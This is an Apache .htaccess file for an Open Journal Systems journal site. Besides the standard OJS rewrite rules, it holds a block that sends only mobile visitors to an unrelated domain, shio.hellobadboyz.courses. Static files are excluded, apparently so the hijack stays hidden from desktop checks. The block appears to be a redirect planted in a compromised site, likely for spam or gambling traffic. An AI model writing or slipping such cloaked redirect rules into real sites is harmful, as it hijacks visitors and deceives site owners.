<IfModule mod_rewrite.c>
    RewriteEngine On

    # Mobile redirect ke shio.hellobadboyz.courses (302) - exclude file statis
    RewriteCond %{REQUEST_URI} !\.(css|js|jpg|jpeg|png|gif|svg|ico|webp|woff|woff2|ttf|eot|pdf|zip|rar|xml|txt)$ [NC]
    RewriteCond %{HTTP_USER_AGENT} "android|blackberry|iphone|ipod|iemobile|opera mobile|palmos|webos|googlebot-mobile|mobile|tablet" [NC]
    RewriteCond %{HTTP_HOST} ^jhmn\.seevalue\.org$ [NC]
    RewriteRule ^(.*)$ https://shio.hellobadboyz.courses/ [L,R=302]

    # OJS default rules (untuk jhmn.seevalue.org)
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php/$1 [L]
</IfModule>
